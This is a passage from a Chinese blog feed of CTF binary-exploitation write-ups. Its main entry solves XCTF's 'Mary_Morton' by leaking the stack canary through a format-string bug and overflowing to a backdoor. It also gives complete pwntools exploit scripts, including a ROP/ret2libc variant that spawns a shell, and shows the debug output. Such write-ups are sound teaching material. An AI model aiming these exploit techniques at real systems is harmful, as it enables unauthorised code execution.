<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0400589</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>结果：<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x41</span> bytes<span class="token punctuation">:</span>    <span class="token number">00000000</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  │AAAA│AAAA│AAAA│AAAA│    <span class="token number">00000010</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">9c</span> <span class="token number">08</span> <span class="token number">40</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  │AAAA│AAAA│··@·│····│    <span class="token number">00000020</span>  a3 <span class="token number">08</span> <span class="token number">40</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token number">9a</span> <span class="token number">2e</span> <span class="token number">4e</span> <span class="token number">90</span>  <span class="token number">93</span> <span class="token number">7f</span> <span class="token number">00</span> <span class="token number">00</span>  │··@·│····│·<span class="token punctuation">.</span>N·│····│    <span class="token number">00000030</span>  <span class="token number">89</span> <span class="token number">05</span> <span class="token number">40</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token number">40</span> e4 <span class="token number">37</span> <span class="token number">90</span>  <span class="token number">93</span> <span class="token number">7f</span> <span class="token number">00</span> <span class="token number">00</span>  │··@·│····│@·<span class="token number">7</span>·│····│    <span class="token number">00000040</span>  <span class="token number">0a</span>                                                  │·│    <span class="token number">00000041</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode$ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>    <span class="token string">'hunter\n'</span>hunter$  </code></pre><p><strong>这个题，漏洞在其他函数而payload构造在主函数。</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf-challenge-Mary_Morton</title>
      <link href="/2020/07/18/xctf-challenge-mary-morton/"/>
      <url>/2020/07/18/xctf-challenge-mary-morton/</url>
      
        <content type="html"><![CDATA[<h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_challenge$ checksec Mary_Morton<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/Mary_Morton'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span></code></pre><p>Canary  NX防护打开</p><h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall __noreturn <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+24h] [rbp-Ch]</span>  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-8h]</span>  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_4009FF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  #setbuf   <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to the battle ! "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[Great Fairy] level pwned "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Select your weapon "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">sub_4009DA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           #输出提示符      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">sub_4008EB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    #格式化字符串漏洞    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Bye "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token function">sub_400960</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>           #存在溢出    <span class="token keyword">else</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>后门：<span class="token keyword">int</span> <span class="token function">sub_4008DA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat ./flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>如果没有后门这个题会让我呛得慌</code></pre><h3 id="函数sub-4008EB-："><a href="#函数sub-4008EB-：" class="headerlink" title="函数sub_4008EB()："></a>函数sub_4008EB()：</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sub_4008EB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-90h]     #别误以为buf是大小为90h的数组，擦亮眼睛</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+88h] [rbp-8h]</span>  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">40u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">127uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">40u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>read函数只能读入127个字符，无法溢出，显然只能利用下面的格式化字符串漏洞。<br>printf因为RELRO关闭可改写got表，以及其他数据，泄露地址那是基本能力。</p><h3 id="函数sub-400960："><a href="#函数sub-400960：" class="headerlink" title="函数sub_400960："></a>函数sub_400960：</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sub_400960</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-90h]</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+88h] [rbp-8h]</span>  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">40u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">256uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-> %s\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">40u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里read可以往buf地址处读入256个字符，而buf离RBP距离为90h所以存在溢出。但别忘了canary开启。<br>canary一般就在RBP上面，如果不记得了可以看汇编代码：</p><pre class=" language-bash"><code class="language-bash">buf<span class="token operator">=</span> byte ptr -90hvar_8<span class="token operator">=</span> qword ptr -8<span class="token punctuation">;</span> __unwind <span class="token punctuation">{</span>push    rbpmov     rbp, rspsub     rsp, 90hmov     rax, fs:28hmov     <span class="token punctuation">[</span>rbp+var_8<span class="token punctuation">]</span>, rax        <span class="token comment" spellcheck="true">#[rbp+var_8]就是rbp-8即rbp上面一个栈帧</span>xor     eax, eaxlea     rdx, <span class="token punctuation">[</span>rbp+buf<span class="token punctuation">]</span></code></pre><h2 id="3：思路"><a href="#3：思路" class="headerlink" title="3：思路"></a>3：思路</h2><h3 id="综上"><a href="#综上" class="headerlink" title="综上"></a>综上</h3><ul><li>canary，NX开启</li><li>整个程序存在格式化字符串漏洞和溢出漏洞</li><li>存在后门</li><li>所以利用格式化字符串漏洞泄露canary，每个char buf都会被插入cookie</li><li>padding+cookie绕过canary，控制程序流程</li></ul><h3 id="格式化字符串漏洞泄露偏移量"><a href="#格式化字符串漏洞泄露偏移量" class="headerlink" title="格式化字符串漏洞泄露偏移量"></a>格式化字符串漏洞泄露偏移量</h3><pre><code>Welcome to the battle ! [Great Fairy] level pwned Select your weapon 1. Stack Bufferoverflow Bug 2. Format String Bug 3. Exit the battle 2AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%pAAAAAAAA0x7ffc11daed70.0x7f.0x7f82284ed081.(nil).(nil).0x4141414141414141.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e701. Stack Bufferoverflow Bug 2. Format String Bug 3. Exit the battle 闹钟64位就用8个A好看一点，偏移量是6这作者还设了一个闹钟，很烦~~~</code></pre><p>我们来看看sub_4008EB（字符串漏洞）函数的栈分布：<br><img src="https://s1.ax1x.com/2020/07/18/U2sMeU.png" alt=""><br>那么可以很容易算出cookie的偏移位置：(0x90-0x8)/8 + 6 ==&gt;23.</p><p>来试一试：</p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_challenge$ ./Mary_Morton Welcome to the battle <span class="token operator">!</span> <span class="token punctuation">[</span>Great Fairy<span class="token punctuation">]</span> level pwned Select your weapon 1. Stack Bufferoverflow Bug 2. Format String Bug 3. Exit the battle 2%23<span class="token variable">$pAAA</span>0xceb50cabb0ce3f00AAA                <span class="token comment" spellcheck="true">#千万记住你后面AAA会接在你泄露地址后面，别把他们当作泄露的一部分了</span>1. Stack Bufferoverflow Bug          <span class="token comment" spellcheck="true">#没错这个离谱的数就是cookie了，有离谱和末尾的00作证</span>2. Format String Bug 3. Exit the battle 闹钟</code></pre><p><strong>泄露成功！什么你说我泄露 sub_4008EB里面的cookie关sub_400960的cookie什么事？我说他们是周树人和鲁迅关系你信吗，反正我信了。</strong></p><p>之后我们进入栈溢出函数构造payload即可实现跳转到后门。</p><h3 id="溢出点计算"><a href="#溢出点计算" class="headerlink" title="溢出点计算"></a>溢出点计算</h3><p>之前我以为有canary，溢出点就很难用gdb测出来了。其实并没有，我们来看看溢出函数栈是啥情况：<br>函数开始的部分汇编代码：</p><pre><code>push    rbpmov     rbp, rspsub     rsp, 90hmov     rax, fs:28hmov     [rbp+var_8], raxxor     eax, eaxlea     rdx, [rbp+buf]</code></pre><p>一般程序栈的返回地址，RBP/EBP会在最前面就布置好，就像上面那样，显然是一般函数的栈分布：<br><img src="https://s1.ax1x.com/2020/07/18/U2suLT.png" alt=""><br>那么payload：’A’*(0x90-8) + p64(cookie) + ‘AAAAAAAA’ + p64(backdoor)</p><h2 id="4-EXP"><a href="#4-EXP" class="headerlink" title="4:EXP"></a>4:EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./Mary_Morton'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'%23$pAAA'</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>cookie <span class="token operator">=</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span> cookiesh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>backdoor <span class="token operator">=</span> <span class="token number">0x04008DA</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'AAAAAAAA'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="5-EXP无后门版"><a href="#5-EXP无后门版" class="headerlink" title="5:EXP无后门版"></a>5:EXP无后门版</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'Mary_Morton'</span><span class="token punctuation">)</span>system_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>bss_addr <span class="token operator">=</span> <span class="token number">0x0601080</span>door <span class="token operator">=</span> <span class="token number">0x004008DA</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0400ab3</span><span class="token comment" spellcheck="true">#main : 0x0400826</span><span class="token comment" spellcheck="true">#RDI, RSI, RDX, RCX, R8 R9</span><span class="token comment" spellcheck="true">#0x0000000000400659 : ret</span><span class="token comment" spellcheck="true">#0x0400B2B cat</span><span class="token comment" spellcheck="true">#0400ab3 : pop rdi ; ret</span><span class="token comment" spellcheck="true">#0400960 overflow</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./Mary_Morton'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = remote('220.249.52.133',40551)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"#############leaking the cookie#################"</span>payload <span class="token operator">=</span> <span class="token string">'%23$pAAA'</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>cookie <span class="token operator">=</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> cookie<span class="token keyword">print</span> <span class="token string">"#############leaking the puts_addr#################"</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'AAAAAAAA'</span> payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000400659</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#payload += p64(pop_rdi_ret) + p64(0x0400B2B) + p64(system_plt)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000400659</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0400826</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>tmp <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x00'</span> <span class="token operator">+</span> <span class="token string">'\x00'</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"puts_addr==>"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"libc_addr==>"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> libc_addr<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"#############final attack#################"</span>payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'AAAAAAAA'</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000400659</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>结果：Welcome to the battle ! <span class="token punctuation">[</span>Great Fairy<span class="token punctuation">]</span> level pwned Select your weapon <span class="token number">1</span><span class="token punctuation">.</span> Stack Bufferoverflow Bug <span class="token number">2</span><span class="token punctuation">.</span> Format String Bug <span class="token number">3</span><span class="token punctuation">.</span> Exit the battle <span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x2</span> bytes<span class="token punctuation">:</span>    <span class="token string">'1\n'</span><span class="token comment" spellcheck="true">#############final attack#################</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0xb9</span> bytes<span class="token punctuation">:</span>    <span class="token number">00000000</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  │AAAA│AAAA│AAAA│AAAA│    <span class="token operator">*</span>    <span class="token number">00000080</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">00</span> d0 eb ef  e0 eb d0 <span class="token number">4c</span>  │AAAA│AAAA│····│···L│    <span class="token number">00000090</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">59</span> <span class="token number">06</span> <span class="token number">40</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  │AAAA│AAAA│Y·@·│····│    <span class="token number">000000a0</span>  b3 <span class="token number">0a</span> <span class="token number">40</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token number">9a</span> <span class="token number">4e</span> <span class="token number">3a</span> <span class="token number">79</span>  <span class="token number">16</span> <span class="token number">7f</span> <span class="token number">00</span> <span class="token number">00</span>  │··@·│····│·N<span class="token punctuation">:</span>y│····│    <span class="token number">000000b0</span>  <span class="token number">40</span> <span class="token number">04</span> <span class="token number">24</span> <span class="token number">79</span>  <span class="token number">16</span> <span class="token number">7f</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token number">0a</span>                        │@·$y│····│·│    <span class="token number">000000b9</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x8c</span> bytes<span class="token punctuation">:</span>    <span class="token string">'-> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'</span><span class="token operator">-</span><span class="token operator">></span> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>    <span class="token string">'hunter\n'</span>hunter<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive$  </code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wiki-hijack GOT</title>
      <link href="/2020/07/17/wiki-hijack-got/"/>
      <url>/2020/07/17/wiki-hijack-got/</url>
      
